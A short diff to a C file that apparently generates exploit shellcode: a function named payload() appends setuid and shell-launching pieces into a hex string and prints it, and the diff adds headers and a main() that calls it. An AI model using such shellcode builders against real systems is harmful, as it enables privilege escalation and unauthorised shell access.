@@ -1,4 +1,6 @@
 #include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
 
 #define	BLENGTH	128
 
@@ -40,4 +42,10 @@ payload()
 	strcat(hexPayload, setuid());
 	strcat(hexPayload, launchShell());
 	printf("%s\n", hexPayload);
+}
+
+int main()
+{
+	payload();
+	return 0;
 }
